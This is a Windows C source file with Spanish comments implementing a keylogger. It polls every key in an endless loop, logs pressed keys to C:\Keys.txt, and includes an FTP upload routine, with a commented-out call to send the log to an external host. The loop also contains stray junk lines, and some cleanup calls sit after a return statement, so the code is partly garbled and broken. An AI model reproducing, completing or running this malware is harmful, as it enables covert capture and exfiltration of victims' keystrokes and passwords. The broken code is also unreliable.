#include <windows.h> 
#include <stdio.h>
#include <wininet.h>


int SubirFTP(char*, char*, char*, int, char*, char*);
FILE *ar;
int r,i=0,a;
const int ac = -32767;

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)

{                   
                    
for(;;)
{
       for(r = 20 ; r <= 'Z'; r++) /* hacemos que el for recorra TODAS LAS LETRAS, pongo desde la 20 porque el espacio es el caracter nº 20 */
           {
            
              if(GetAsyncKeyState(r) == ac) /* si alguna tecla esta siendo presionada */
                 {
                    ar=fopen("C:\\Keys.txt", "a+"); /* abrimos el archivo C:\\Keystxt con privilegios de escritura */
                    fprintf(ar, "%c", r); /* le escribimos el valor de r (la variable del for) pasado a caracter, solamente lo ponemos como char y se guarda como caracter */
                    fclose(ar); /* cerramos el archivo */
                 }
            }ffffffffffffffffffffffffffffff
            ggggggggggggggggggggggggggggggggggggggggggggggggggg
            ffffffffffffffffffffff
      //if(i==200)
      //{
      //SubirFTP("apsq.zzl.org", "apsq_zzl", "", 21, "C:\\Keys.txt", "keys.txt");
      //}
            
}

return 0;
}                

int SubirFTP(char *servidor, char *usuario, char *password,
             int puerto, char *aLocal, char *aRemoto)
{ 
    
                             // alocal puntero a una variable de tipo char [es el nombre del archivo a subir que esta en nuestro pc.]
    HINTERNET Peticion;      // aRemoto puntero a una variable de tipo char [ es el nombre de como llegara e archivo al servidor]
    
    Peticion = InternetOpen("Mozilla Firefox",0,NULL,NULL,0);
    if(Peticion == NULL)
    {
         return 1;
    } else 
    {
       HINTERNET Conectar;
       Conectar = InternetConnect(Peticion,servidor,puerto,
                                  usuario,password,INTERNET_SERVICE_FTP,0,0);
    
       if(Conectar == NULL)
       {
          InternetCloseHandle(Conectar);
          return 1;
       } else
       {
          if(FtpPutFile(Conectar,aLocal,aRemoto,FTP_TRANSFER_TYPE_BINARY,0) == FALSE)
          {
             return 1;
          }

          return 0;
          InternetCloseHandle(Peticion);
          InternetCloseHandle(Conectar);

       }

    }

}
